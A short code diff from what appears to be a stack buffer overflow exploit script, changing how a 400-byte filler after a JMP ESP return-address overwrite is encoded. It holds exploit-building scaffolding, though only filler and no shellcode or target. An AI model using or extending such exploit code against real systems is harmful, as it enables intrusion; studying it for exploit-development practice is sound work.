@@ -52,7 +52,7 @@ class Classic:
 
         self.eip = pack('<L', int("0x" + jmp_esp, 16))
 
-        self.esp = "C" * 400
+        self.esp = ("C" * 400).encode('latin-1')
 
         self.buffer = offset + self.eip + self.esp
         self.buffer += "\r\n"
